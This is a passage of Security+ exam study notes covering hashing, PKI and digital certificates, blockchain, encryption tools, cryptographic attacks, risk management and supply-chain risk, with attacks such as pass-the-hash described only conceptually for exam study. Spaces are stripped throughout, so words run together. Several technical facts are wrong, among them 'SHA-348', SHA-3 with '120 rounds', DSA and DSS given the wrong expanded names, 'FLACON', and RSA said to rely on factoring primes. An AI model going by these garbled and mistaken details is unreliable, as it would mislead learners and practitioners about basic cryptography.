+● Reliesonthemathematicaldifficultyoffactoringlargeprimenumbers● Supportskeysizesfrom1024to4096bits● Widelyusedinorganizationsandmulti-factorauthentication■ EllipticCurveCryptography(ECC)● Efficientandsecure,usesalgebraicstructureofellipticalcurves● Commonlyusedinmobiledevicesandlow-powercomputing● SixtimesmoreefficientthanRSAforequivalentsecurity● Variantsinclude○ ECDH(EllipticCurveDiffie-Hellman)○ ECDHE(EllipticCurveDiffie-HellmanEphemeral)○ ECDSA(EllipticCurveDigitalSignatureAlgorithm)
+
+● Hashing○ Hashing■ One-waycryptographicfunctionthatproducesauniquemessagedigestfroman
+
+input○ HashDigest■ Likeadigitalfingerprintfortheoriginaldata■ Alwaysofthesamelengthregardlessoftheinput'slength○ CommonHashingAlgorithms■ MD5(MessageDigestAlgorithm5)● Createsa128-bithashvalue● Limiteduniquevalues,leadingtocollisions● Notrecommendedforsecurity-criticalapplicationsduetovulnerabilities
+
+89https://www.DionTraining.com
+
+## Page 90
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ SHA(SecureHashAlgorithm)Family● SHA-1○ Producesa160-bithashdigest,lesspronetocollisionsthanMD5● SHA-2○ Offerslongerhashdigests(SHA-224,SHA-256,SHA-348,SHA-512)● SHA-3○ Uses224-bitto512-bithashdigests,moresecure,120roundsof
+
+computations■ RIPEMD(RACEIntegrityPrimitiveEvaluationMessageDigest)● Versionsavailable○ 160-bit(Mostcommon)○ 256-bit○ 320-bit● Open-sourcecompetitortoSHAbutlesspopular■ HMAC(Hash-basedMessageAuthenticationCode)● Checksmessageintegrityandauthenticity● Utilizesotherhashingalgorithms(e.g.,HMAC-MD5,HMAC-SHA1,
+
+HMAC-SHA256)○ DigitalSignatures■ Usesahashdigestencryptedwithaprivatekey■ Senderhashesthemessageandencryptsthehashwiththeirprivatekey■ Recipientdecryptsthedigitalsignatureusingthesender'spublickey■ Verifiesintegrityofthemessageandensuresnon-repudiation○ CommonDigitalSignatureAlgorithms■ DSA(DigitalSecurityAlgorithm)● Utilizedfordigitalsignatures
+
+90https://www.DionTraining.com
+
+## Page 91
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Usesa160-bitmessagedigestcreatedbyDSS(DigitalSecurityStandard)■ RSA(Rivest-Shamir-Adleman)● Supportsdigitalsignatures,encryption,andkeydistribution● Widelyusedinvariousapplications,includingcodesigning○ Hasheschangedrasticallyevenwithminorchangesininput○ Hashingisusedtoverifydataintegrityanddetectanychanges
+
+● IncreasingHashSecurity○ CommonHashingAttacks■ PasstheHashAttack● Ahackingtechniquethatallowstheattackertoauthenticatetoaremote
+
+serverorservicebyusingtheunderlyinghashofauser'spassword
+
+insteadofrequiringtheassociatedplaintextpassword● Hashescanbeobtainedbyattackerstoimpersonateuserswithout
+
+crackingthepassword● DifficulttodefendagainstduetovariousWindowsvulnerabilitiesand
+
+applications● PenetrationtoolslikeMimikatzautomatehashharvesting● Prevention○ EnsuretrustedOS○ ProperWindowsdomaintrusts○ Patching○ Multi-factorauthentication○ Leastprivilege
+
+91https://www.DionTraining.com
+
+## Page 92
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ BirthdayAttack● Occurswhentwodifferentmessagesresultinthesamehashdigest
+
+(collision)● NamedaftertheBirthdayParadox,wheresharedbirthdaysbecomelikely
+
+inagroup● Collisionsinhashescanbeexploitedbyattackerstobypass
+
+authenticationsystems● Uselongerhashoutput(e.g.,SHA-256)toreducecollisionsandmitigate
+
+theattack○ IncreasingHashSecurity■ KeyStretching● Techniquethatisusedtomitigateaweakerkeybycreatinglonger,more
+
+securekeys(atleast128bits)○ increasesthetimeneededtocrackthekey● UsedinsystemslikeWi-FiProtectedAccess,Wi-FiProtectedAccess
+
+version2,andPrettyGoodPrivacy■ Salting● Addsrandomdata(salt)topasswordsbeforehashing● Ensuresdistincthashoutputsforthesamepasswordduetodifferent
+
+salts● Thwartsdictionaryattacks,brute-forceattacks,andrainbowtables■ Nonces(NumberUsedOnce)● Addsunique,oftenrandomnumberstopassword-basedauthentication
+
+processes● Preventsattackersfromreusingstolenauthenticationdata● Addsanextralayerofsecurityagainstreplayattacks
+
+92https://www.DionTraining.com
+
+## Page 93
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ LimitingFailedLoginAttempts● Restrictsthenumberofincorrectloginattemptsausercanmake● Increasessecuritybydeterringattackersattemptingtoguesspasswords● Typically,locktheaccountafterthreeincorrectattempts
+
+● PublicKeyInfrastructure(PKI)○ PKIComponents■ Anentiresysteminvolvinghardware,software,policies,procedures,andpeople■ Basedonasymmetricencryption■ Facilitatessecuredatatransfer,authentication,andencryptedcommunications■ UsedinHTTPSconnectionsonwebsites○ EstablishingaSecureConnection■ UserconnectstoawebsiteviaHTTPS■ Webbrowsercontactsatrustedcertificateauthorityforthewebserver'spublic
+
+key■ Arandomsharedsecretkeyisgeneratedforsymmetricencryption■ Thesharedsecretissecurelytransmittedusingpublickeyencryption■ Thewebserverdecryptsthesharedsecretwithitsprivatekey■ Bothpartiesusethesharedsecretforsymmetricencryption(e.g.,AES)tocreate
+
+asecuretunnel○ SecurityBenefits■ Confidentiality● Dataisencryptedusingasharedsecret■ Authentication● Thewebserver'sidentityisverifiedusingitsprivatekey
+
+93https://www.DionTraining.com
+
+## Page 94
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Visualindicatorslikeapadlockshowsecurecommunication○ PublicKeyInfrastructurevs.PublicKeyCryptography■ PublicKeyInfrastructure(PKI)● Encompassestheentiresystemformanagingkeypairs,policies,andtrust● Involvesgenerating,validating,andmanagingpublicandprivatekeypairs
+
+thatareusedintheencryptionanddecryptionprocess● Ensuresthesecurityandtrustworthinessofkeys■ PublicKeyCryptography● Referstotheencryptionanddecryptionprocessusingpublicandprivate
+
+keys● OnlyapartoftheoverallPKIarchitecture○ KeyEscrow■ Storageofcryptographickeysinasecure,third-partylocation(escrow)■ Enableskeyretrievalincasesofkeylossorforlegalinvestigations■ RelevanceinPKI● InPKI,keyescrowensuresthatencrypteddataisnotpermanently
+
+inaccessible● Usefulwhenindividualsororganizationsloseaccesstotheirencryption
+
+keys■ SecurityConcerns● Maliciousaccesstoescrowedkeyscouldleadtodatadecryption● Requiresstringentsecuritymeasuresandaccesscontrols
+
+● DigitalCertificates○ DigitalCertificates■ Digitallysignedelectronicdocuments
+
+94https://www.DionTraining.com
+
+## Page 95
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Bindapublickeywithauser'sidentity■ Usedforindividuals,servers,workstations,ordevices■ UsetheX.509Standard● CommonlyusedstandardfordigitalcertificateswithinPKI● Containsowner's/user'sinformationandcertificateauthoritydetails○ TypesofDigitalCertificates■ WildcardCertificate● Allowsmultiplesubdomainstousethesamecertificate● Easiermanagement,cost-effectiveforsubdomains● Compromiseaffectsallsubdomains■ SAN(SubjectAlternateName)field● CertificatethatspecifieswhatadditionaldomainsandIPaddressesare
+
+goingtobesupported● Usedwhendomainnamesdon’thavethesamerootdomain■ Single-SidedandDual-SidedCertificates● Single-sided○ Onlyrequirestheservertobevalidated● Dual-sided○ Bothserveranduservalidateeachother○ Dual-sidedforhighersecurity,requiresmoreprocessingpower■ Self-SignedCertificates● Digitalcertificatethatissignedbythesameentitywhoseidentityit
+
+certifies● Providesencryptionbutlacksthird-partytrust● Usedintestingorclosedsystems■ Third-PartyCertificates
+
+95https://www.DionTraining.com
+
+## Page 96
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Digitalcertificateissuedandsignedbytrustedcertificateauthorities(CAs)● Trustedbybrowsersandsystems● Preferredforpublic-facingwebsites○ KeyConcepts■ RootofTrust● Highestleveloftrustincertificatevalidation● Trustedthird-partyproviderslikeVerisign,Google,etc.● Formsacertificationpathfortrust■ CertificateAuthority(CA)● Trustedthirdpartythatissuesdigitalcertificates● CertificatescontainCA'sinformationanddigitalsignature● Validatesandmanagescertificates■ RegistrationAuthority(RA)● Requestsidentifyinginformationfromtheuserandforwardscertificate
+
+requestuptotheCAtocreateadigitalcertificate● Collectsuserinformationforcertificates● Assistsinthecertificateissuanceprocess■ CertificateSigningRequest(CSR)● Ablockofencodedtextwithinformationabouttheentityrequestingthe
+
+certificate● Includesthepublickey● SubmittedtoCAforcertificateissuance● Privatekeyremainssecurewiththerequester■ CertificateRevocationList(CRL)● MaintainedbyCAs● Listofalldigitalcertificatesthatthecertificateauthorityhasalready
+
+96https://www.DionTraining.com
+
+## Page 97
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+revoked● Checkedbeforevalidatingacertificate■ OnlineCertificateStatusProtocol(OCSP)● Determinescertificaterevocationstatusoranydigitalcertificateusingthe
+
+certificate'sserialnumber● FasterbutlesssecurethanCRL■ OCSPStapling● AlternativetoOCSP● AllowsthecertificateholdertogettheOCSPrecordfromtheserverat
+
+regularintervals● IncludesOCSPrecordintheSSL/TLShandshake● Speedsupthesecuretunnelcreation■ PublicKeyPinning● AllowsanHTTPSwebsitetoresistimpersonationattacksfromuserswho
+
+aretryingtopresentfraudulentcertificates● Presentstrustedpublickeystobrowsers● Alertsusersifafraudulentcertificateisdetected■ KeyEscrowAgents● Securelystorecopiesofprivatekeys● Ensureskeyrecoveryincaseofloss● Requiresstrongaccesscontrols■ KeyRecoveryAgents● Specializedtypeofsoftwarethatallowstherestorationofalostor
+
+corruptedkeytobeperformed● Actsasabackupforcertificateauthoritykeys○ TrustinDigitalCertificates
+
+97https://www.DionTraining.com
+
+## Page 98
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Trustisessentialindigitalcertificates■ CompromisedrootCAscanimpactallissuedcertificates■ CommerciallytrustedCAsaremoresecure■ Self-managedCAsmustbevigilantagainstcompromises
+
+● Blockchain○ Blockchain■ Sharedimmutableledgerfortransactionsandassettracking■ Buildstrustandtransparency■ WidelyassociatedwithcryptocurrencieslikeBitcoin■ Isessentiallyareallylongseriesofinformationwitheachblockcontaining
+
+informationinit● Eachblockhasthehashfortheblockbeforeit■ BlockStructure● Chainofblocks,eachcontaining○ Previousblock'shash○ Timestamp○ Roottransactions(hashesofindividualtransactions)● Blocksarelinkedtogetherinachronologicalorder■ PublicLedger● Secureandanonymousrecord-keepingsystem● Maintainsparticipants'identities● Trackscryptocurrencybalances● Recordsallgenuinetransactionsinanetwork○ BlockchainApplications■ SmartContracts
+
+98https://www.DionTraining.com
+
+## Page 99
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Self-executingcontractswithcode-definedterms● Executeactionsautomaticallywhenconditionsaremet● Transparent,tamper-proof,andtrust-enhancing■ CommercialUses● CompanieslikeIBMpromoteblockchainforcommercialpurposes● Permissionedblockchainusedforbusinesstransactions● Enhancestrustandtransparencywithimmutablepublicledger■ SupplyChainManagement● Transparencyandtraceabilityinthesupplychain● Immutablerecordsofproductorigin,handling,anddistribution● Ensurescomplianceandqualitycontrol○ BroadImplicationsofBlockchain■ Versatility● Beyondfinanceandcryptocurrencies● Applicationsacrossvariousindustries● Promisestransparency,efficiency,andtrust■ Decentralization● Keyfeatureofblockchain● Eliminatesneedforcentralauthorities● Empowerspeer-to-peernetworks■ ImmutableLedger● Ensuresdataintegrity● Recordscannotbealteredordeleted● Reinforcestrustintransactionsandinformation■ DigitalEvolution● Blockchain'simpactontechnologyandindustries
+
+99https://www.DionTraining.com
+
+## Page 100
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Potentialtoreshapetraditionalsystems● Offerstransparency,efficiency,andtrustinthedigitalera
+
+● EncryptionTools○ EncryptionToolsforDataSecurity■ TPM(TrustedPlatformModule)● Dedicatedmicrocontrollerforhardware-levelsecurity● Protectsdigitalsecretsthroughintegratedcryptographickeys● UsedinBitLockerdriveencryptionforWindowsdevices● Addsanextralayerofsecurityagainstsoftwareattacks■ HSM(HardwareSecurityModule)● Physicaldeviceforsafeguardingandmanagingdigitalkeys● Idealformission-criticalscenarioslikefinancialtransactions● Performsencryptionoperationsinatamper-proofenvironment● Ensureskeysecurityandregulatorycompliance■ KeyManagementSystem● Manages,stores,distributes,andretirescryptographickeys● Centralizedmechanismforkeylifecyclemanagement● Crucialforsecuringdataandpreventingunauthorizedaccess● Automateskeymanagementtasksincomplexenvironments■ SecureEnclaves● Coprocessorintegratedintothemainprocessorofsomedevices● Isolatedfromthemainprocessorforsecuredataprocessingandstorage● Safeguardssensitivedatalikebiometricinformation● Enhancesdevicesecuritybypreventingunauthorizedaccess
+
+100https://www.DionTraining.com
+
+## Page 101
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Obfuscation○ ObfuscationTechniquesinDataSecurity■ Steganography● Concealsamessagewithinanothertohideitsveryexistence● Involvesalteringimageordataelementstoembedhiddeninformation● Primarygoalistopreventthesuspicionthatthere’sanyhiddendataatall● Usedalongsideencryptionforaddedsecurity● Detectionischallengingduetohidingdatainplainsight■ Tokenization● Substitutessensitivedatawithnon-sensitivetokens● Originaldatasecurelystoredelsewhere● Tokenshavenointrinsicvalue● Reducesexposureofsensitivedataduringtransactions● Commonlyusedforpaymentsystemstocomplywithsecuritystandards■ DataMasking(DataObfuscation)● Disguisesoriginaldatatoprotectsensitiveinformation● Maintainsdataauthenticityandusability● Usedintestingenvironments,especiallyforsoftwaredevelopment● Reducestheriskofdatabreachesinnon-productionsettings● Commoninindustrieshandlingpersonaldata● Masksportionsofsensitivedataforprivacy,e.g.,creditcarddigits,social
+
+securitynumbers
+
+● CryptographicAttacks○ CryptographicAttacks
+
+101https://www.DionTraining.com
+
+## Page 102
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Techniquesandstrategiesthatadversariesemploytoexploitvulnerabilitiesin
+
+cryptographicsystemswiththeintenttocompromisetheconfidentiality,
+
+integrity,orauthenticityofdata○ DowngradeAttacks■ Forcesystemstouseweakeroroldercryptographicstandardsorprotocols■ Exploitknownvulnerabilitiesorweaknessesinoutdatedversions■ Example:POODLEattackonSSL3.0■ Countermeasuresincludephasingoutsupportforinsecureprotocolsand
+
+version-intolerantchecks○ CollisionAttacks■ Findtwodifferentinputsproducingthesamehashoutput■ Underminedataintegrityverificationrelyingonhashfunctions■ Vulnerabilitiesinhashingalgorithms,e.g.,MD5,canleadtocollisions■ BirthdayParadoxorBirthdayAttack● Theprobabilitythattwodistinctinputs,whenprocessedthrougha
+
+hashingfunction,willproducethesameoutput,oracollision○ QuantumComputingThreat■ Quantumcomputing● Acomputerthatusesquantummechanicstogenerateandmanipulate
+
+quantumbitsinordertoaccessenormousprocessingpowers.● Usesquantumbits(qubits)insteadofusingonesandzeros■ QuantumCommunication● Acommunicationsnetworkthatreliesonqubitsmadeofphotons(light)
+
+tosendmultiplecombinationsofonesandzerossimultaneouslywhich
+
+resultsintamperresistantandextremelyfastcommunications■ Qubit
+
+102https://www.DionTraining.com
+
+## Page 103
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Aquantumbitcomposedofelectronsorphotonsthatcanrepresent
+
+numerouscombinationsofonesandzerosatthesametimethrough
+
+superposition● Enablesimultaneousprocessingofmultiplecombinations■ Quantumcomputingisdesignedforveryspecificusecases● Complexmathproblems● Tryingtodosomethinglikethemodelingofanatomoratomicstructure■ Threattotraditionalencryptionalgorithms(RSA,ECC)byrapidfactorizationof
+
+largeprimenumbers■ Post-quantumcryptography● Anewkindofcryptographicalgorithmthatcanbeimplementedusing
+
+today’sclassiccomputersbutisalsoimpervioustoattacksfromfuture
+
+quantumcomputers● Aimstocreatealgorithmsresistanttoquantumattacks● Firstmethodistocreatepost-quantumcryptographyistoincreasethe
+
+keysize○ Increasesthenumberofpermutationsthatareneededtobe
+
+brute-forced● Secondmethodistocreatesomethinglikelattice-basedcryptography
+
+andsupersingularisogenykeyexchange■ NISTselectedfourpost-quantumcryptographystandards● CRYSTALS-Kyber-generalencryptionneeds● Digitalsignatures○ CRYSTALS-Dilithium○ FLACON
+
+### ○ Sphincs+
+
+103https://www.DionTraining.com
+
+## Page 104
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+RiskManagement
+
+Objective5.2:Explainelementsoftheriskmanagementprocess
+
+● RiskManagement○ RiskManagement■ Fundamentalprocessinvolvingidentification,analysis,treatment,monitoring,
+
+andreportingofrisks○ RiskManagementLifecycle■ RiskIdentification● Proactiveprocessrecognizingpotentialrisks● Goal○ Createacomprehensivelistbasedoneventshinderingobjectives■ RiskAnalysis● Evaluatelikelihoodandpotentialimpact● Qualitativeorquantitativemethods● Outcome○ Prioritizedlistforguidingrisktreatment■ RiskTreatment● Developstrategies○ Avoidance○ Reduction○ Sharing○ Acceptance
+
+104https://www.DionTraining.com
+
+## Page 105
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Strategychoicebasedonpotentialimpactandrisktolerance● Goal○ Reducepotentialimpacttoanacceptablelevel■ RiskMonitoring● Ongoingprocesstrackingidentifiedrisks● Monitorresidualrisks,identifynewrisks,andreviewriskmanagement
+
+effectiveness● Ensuresdynamicresponsivenesstoorganizationalchanges■ RiskReporting● Communicateriskinformationandeffectivenessofriskmanagementto
+
+stakeholders● Variousforms○ Dashboards○ HeatMaps○ DetailedReports● Crucialforaccountabilityandinformeddecision-making○ RiskAssessmentFrequency■ Types● Ad-hoc● Recurring● One-time● Continuous■ Varies● Basedonorganizationnatureandtypesofrisksinvolved
+
+105https://www.DionTraining.com
+
+## Page 106
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ RiskIdentification■ Process● Identifypotentialrisks;performbusinessimpactanalysis.■ Concepts● RecoveryTimeObjective● RecoveryPointObjective● MeanTimetoRepair● MeanTimeBeforeFailure○ QualitativeRiskAnalysis■ Assessandprioritizerisksbasedonlikelihoodandimpact○ QuantitativeRiskAnalysis■ Numericallyestimateprobabilityandpotentialimpact○ RiskManagementStrategies■ Types● RiskTransfer● RiskAcceptance● RiskAvoidance● RiskMitigation○ RiskMonitoringandReporting■ CrucialSteps● Continuoustrackingandregularreporting■ Long-TermImpact● Significantfortheeffectivenessoftheriskmanagementprocess
+
+106https://www.DionTraining.com
+
+## Page 107
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● RiskAssessmentFrequency○ RiskAssessmentFrequency■ Regularitywithwhichriskassessmentsareconductedwithinanorganization○ Fourmaintypesofriskassessmentfrequencies■ Ad-HocRiskAssessments● Conductedasneeded,ofteninresponsetospecificeventsorsituations● Addresspotentialnewrisksorchangesinexistingrisks■ RecurringRiskAssessments● Conductedatregularintervals(e.g.,annually,quarterly,monthly)● Partofstandardoperatingproceduresforcontinualriskidentificationand
+
+management■ One-TimeRiskAssessments● Conductedforspecificprojectsorinitiatives● Notrepeated,associatedwithaparticularpurpose■ ContinuousRiskAssessments● Ongoingmonitoringandevaluationofrisks● Enabledbytechnology,involvingreal-timedatacollectionandanalysis● Usedforproactivethreatandvulnerabilitymonitoring,facilitatingquick
+
+responses
+
+● RiskIdentification○ RiskIdentification■ Crucialfirststepinriskmanagement■ Involvesrecognizingpotentialrisksthatcouldimpactanorganization■ Riskscanvaryfromfinancialandoperationaltostrategicandreputational
+
+107https://www.DionTraining.com
+
+## Page 108
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Techniques● Brainstorming● Checklists● Interviews● ScenarioAnalysis■ Organizationshouldconsiderawiderangeofrisks,includingoperational,
+
+financial,strategic,andreputationalrisks■ Documentandanalyzerisksbasedonimpactandlikelihood○ BusinessImpactAnalysis(BIA)■ Evaluateseffectsofdisruptionsonbusinessfunctions■ Identifiesandprioritizescriticalfunctions■ Assessesimpactofrisksonfunctions■ Determinesrequiredrecoverytimeforfunctions■ KeyMetricsinBIA● RecoveryTimeObjective(RTO)○ Maximumacceptabletimebeforesevereimpact○ Targettimeforrestoringabusinessprocess● RecoveryPointObjective(RPO)○ Maximumacceptabledatalossmeasuredintime○ Pointintimedatamustberestoredto● MeanTimetoRepair(MTTR)○ Averagetimetorepairafailedcomponentorsystem○ Indicatorofrepairspeedanddowntimeminimization● MeanTimeBetweenFailures(MTBF)○ Averagetimebetweensystemorcomponentfailures○ Measureofreliability
+
+108https://www.DionTraining.com
+
+## Page 109
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● RiskRegister○ RiskManagement■ Crucialforprojectsandbusiness,itinvolvestheidentificationandassessmentof
+
+uncertaintiesthatmayimpactobjectives○ RiskRegister■ Recordsidentifiedrisks,descriptions,impacts,likelihoods,andmitigationactions■ Keytoolinriskmanagement■ Mayresembleaheatmapriskmatrix■ Facilitatescommunicationandrisktracking■ Keycomponentofprojectandbusinessoperations○ ComponentsofRiskRegister■ RiskDescription● Identifiesanddescribestherisk● Clearandconcisedescription■ RiskImpact● Potentialconsequencesofriskoccurrence● Ratedonascale(e.g.,low,medium,high)■ RiskLikelihood● Probabilityofriskoccurrence● Ratedonascale(e.g.,numericalordescriptive)■ RiskOutcome● Resultoftheriskifitoccurs● Relatedtoimpactandlikelihood■ RiskLevelorThreshold● Determinedbycombiningtheimpactandlikelihood
+
+109https://www.DionTraining.com
+
+## Page 110
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Prioritizesrisks(e.g.,high,medium,low)■ Cost● Financialimpactontheproject● includespotentialexpensesifitoccursorthecostofriskmitigation○ RiskToleranceandRiskAppetite■ RiskTolerance/RiskAcceptance● Anorganizationorindividual’swillingnesstodealwithuncertaintyin
+
+pursuitoftheirgoals● Maximumamountofrisktheyarewillingtoaccept● Acceptancewithoutcountermeasures■ RiskAppetite● Willingnesstopursueorretainrisk● Types○ Expansionary○ Conservative○ Neutral○ KeyRiskIndicators(KRIs)■ Predictivemetricssignalingincreasingriskexposure■ Provideearlywarningofpotentialrisks■ Tiedtotheorganization'sobjectives■ Usedtomonitorriskchangesandtakeproactivesteps○ RiskOwner■ Responsibleformanagingtherisk■ Monitors,implementsmitigationactions,andupdatesRiskRegister■ Accountableforriskmanagement
+
+110https://www.DionTraining.com
+
+## Page 111
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● QualitativeRiskAnalysis○ QualitativeRiskAnalysis■ Primarymethodinriskmanagement■ Assessesrisksbasedonpotentialimpactandlikelihood■ Categorizesrisksashigh,medium,orlow■ Subjectiveandreliesonexpertiseandexperience■ Avoidsquantitativecomplexity○ KeyComponents■ Likelihood/Probability● Chanceofriskoccurrence● Qualitativelyexpressedaslow,medium,orhigh● Basedonpastexperience,statisticalanalysis,orexpertjudgment■ Impact● Potentialconsequencesifriskoccurs● Qualitativelyratedaslow,medium,orhigh● Assessdamagetoprojectorbusinessobjectives● ImpactLevels○ LowImpact■ Minordamage,essentialfunctionsoperational
+
+○ MediumImpact■ Significantdamage,losstoassets○ HighImpact■ Majordamage,essentialfunctionsimpaired
+
+111https://www.DionTraining.com
+
+## Page 112
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● QuantitativeRiskAnalysis○ QuantitativeRiskAnalysis■ Providesobjectiveandnumericalevaluationofrisks■ Usedforfinancial,safety,andschedulingdecisions■ Utilizeskeycomponents● SingleLossExpectancy(SLE)● ExposureFactor(EF)● AnnualizedRateofOccurrence(ARO)● AnnualizedLossExpectancy(ALE)○ KeyComponents■ ExposureFactor(EF)● Proportionofassetlostinanevent(0%to100%)● Indicatesassetlossseverity■ SingleLossExpectancy(SLE)● Monetaryvalueexpectedtobelostinasingleevent● CalculatedasAssetValuexExposureFactor(EF)■ AnnualizedRateofOccurrence(ARO)● Estimatedfrequencyofthreatoccurrencewithinayear● Providesayearlyprobability■ AnnualizedLossExpectancy(ALE)● Expectedannuallossfromarisk● CalculatedasSLExARO
+
+112https://www.DionTraining.com
+
+## Page 113
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● RiskManagementStrategies○ Fourprimaryriskmanagementstrategies■ RiskTransference● Shiftsrisktoanotherparty● Commonmethods○ Insurance○ Contractindemnityclauses■ Acontractualagreementwhereonepartyagreestocover
+
+theother’sharm,liability,orlossstemmingfromthe
+
+contract● Doesn’tremovetherisk○ Shiftstheresponsibilityforhandlingtherisk’sfinancial
+
+consequences■ RiskAcceptance● Acknowledgeanddealwithriskifitoccurs● Usedwhencostofmanagingtheriskoutweighspotentiallossorriskis
+
+unlikelytohaveasignificantimpact● Noactionstomitigatetheriskaretaken● Methods○ Exemption(excludespartyfromarule)■ Theorganizationdoesn’thavetoobeyaspecificruleor
+
+requirement■ Thereisnoriskofnotcomplyingwiththeruleor
+
+requirement■ Theremaybeabenefitormitigationofferedbytheruleor
+
+requirementwhichexemptedorganizationswon’treceive
+
+113https://www.DionTraining.com
+
+## Page 114
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+becausetheyareexempt○ Exception(allowspartytoavoidruleunderspecificconditions)● InbothExemptionandException,theorganizationassumesriskeitherby
+
+- peratingwithoutthesafeguardsormitigationsofferedbyarule
+(exemption),orbyoperatinginawaythatletsthemevadetherisk
+
+(exception).■ RiskAvoidance● Changeplansorstrategiestoeliminateaspecificrisk● Chosenwhentheriskistoogreattoacceptortransfer■ RiskMitigation● Takestepstoreducelikelihoodorimpactofrisk● Commonstrategyinvolvingvariousactions
+
+● RiskMonitoringandReporting○ RiskMonitoring■ Processof● Trackingidentifiedrisks● Monitoringresidualrisks● Identifyingnewrisks● Evaluatingriskresponseplans■ Involvesongoingtrackingofrisksandtheirresponseactions■ HelpsdetermineResidualRiskandControlRisk● ResidualRisk○ Thelikelihoodandimpactoftheriskaftermitigation,
+
+transference,oracceptancemeasureshavebeentakenonthe
+
+initialrisk
+
+114https://www.DionTraining.com
+
+## Page 115
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● ControlRisk○ Assessmentofhowasecuritymeasurehaslosteffectivenessover
+
+time○ RiskReporting■ Communicatinginformationaboutriskmanagementactivitiestostakeholders■ Includesresultsofriskidentification,assessment,response,andmonitoring■ Oftenpresentedintheformofariskreport○ RiskMonitoringandReportingareessentialfor■ Informeddecisionmaking● Offerinsightsforinformeddecisionsonresourceallocation,project
+
+timelines,andstrategicplanning■ Riskmitigation● Recognizewhenariskisescalatingsoitcanbemitigatedbefore
+
+becominganissue■ Stakeholdercommunication● Assistinsettingexpectationsandshowingeffectiveriskmanagement■ Regulatorycompliance● Demonstratecompliancewiththeseregulations
+
+115https://www.DionTraining.com
+
+## Page 116
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+Third-partyVendorRisks
+
+Objectives:● 2.2-Explaincommonthreatvectorsandattacksurfaces● 2.3-Explainvarioustypesofvulnerabilities● 5.3-Explaintheprocessesassociatedwiththird-partyriskassessmentandmanagement
+
+● Third-partyVendorRisks○ Third-partyVendorRisks■ Potentialsecurityandoperationalchallengesfromexternalcollaborators■ Scope● Encompassesvendors,suppliers,orserviceproviders■ Risks● Impactonintegrity,datasecurity,andoverallbusinesscontinuity○ CommonThreatVectorsandAttackSurfaces■ ThreatVectors● Pathsattackersusetogainaccess■ AttackSurfaces● Pointswhereanunauthorizedusercantrytoenter○ VariousTypesofVulnerabilities■ HardwareVulnerabilities● Componentswithvulnerabilities■ SoftwareVulnerabilities● Applicationswithhiddenbackdoors■ OperationalVulnerabilities● Lackofcybersecurityprotocols
+
+116https://www.DionTraining.com
+
+## Page 117
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ VendorAssessments■ Evaluation● Pre-partnershipassessment■ PenetrationTesting● Testingvendorsecurity■ AuditRights● Righttoauditvendors■ EvidenceCollection● Internalandexternalauditevidence○ VendorSelectionandMonitoring■ Importance● Meticulousselectionprocess■ Vigilance● Ongoingmonitoringofvendorperformance○ ContractsandAgreements■ BasicContracts● Formingrelationships■ NuancedAgreements● SLAs,MOUs,NDAsforspecificsafeguards
+
+● SupplyChainRisks○ HardwareManufacturers■ Productslikeroutersandswitchesarecomposedofmanycomponentsfrom
+
+varioussuppliers■ Componenttamperingoruntrustworthyvendorscanintroducevulnerabilities■ Rigoroussupplychainassessmentsneededtotraceoriginsandcomponent
+
+117https://www.DionTraining.com
+
+## Page 118
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+integrity■ Trustedfoundryprogramsensuresecuremanufacturing○ Secondary/AftermarketSources■ Riskofacquiringcounterfeitortampereddevices■ Devicesmaycontainmalwareorvulnerabilities■ Budget-friendlybuthigh-riskoption○ SoftwareDevelopers/Providers■ Softwaredevelopersandsoftwareprovidersareintegralcogsinthesupplychain● However,softwarecanintroducevulnerabilities■ Checkforproperlicensing,authenticity,knownvulnerabilities,andmalware■ Open-sourcesoftwareallowssourcecodereview■ Proprietarysoftwarecanbescannedforvulnerabilities○ ServiceProviders/MSPs■ ManagedServiceProviders● Organizationsthatprovidearangeoftechnologyservicesandsupportto
+
+businessesandotherclients■ SecuritychallengeswithSoftware-as-a-Service(SaaS)providers● Dataconfidentialityandintegrityconcerns● Assessprovider'scybersecurityprotocolsandsupportforsecurity
+
+incidents● Vendorselectionshouldconsiderduediligence,historicalperformance,
+
+andcommitmenttosecurity■ Considerations● Evaluatedatasecuritymeasures● Ensureconfidentialityandintegrity● Assesscybersecurityprotocols
+
+118https://www.DionTraining.com
+
+## Page 119
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Responsetoasecuritybreach
+
+● SupplyChainAttacks○ SupplyChainAttacks■ Anattackthattargetsaweakerlinkinthesupplychaintogainaccesstoa
+
+primarytarget■ Exploitvulnerabilitiesinsuppliersorserviceproviderstoaccessmoresecure
+
+systems○ CHIPSActof2022■ U.S.federalstatuteprovidingfundingtoboostsemiconductorresearchand
+
+manufacturingintheU.S.■ Aimstoreducerelianceonforeign-madesemiconductors,strengthenthe
+
+domesticsupplychain,andenhancesecurity■ Semiconductors● Essentialcomponentsinawiderangeofproducts,fromsmartphonesand
+
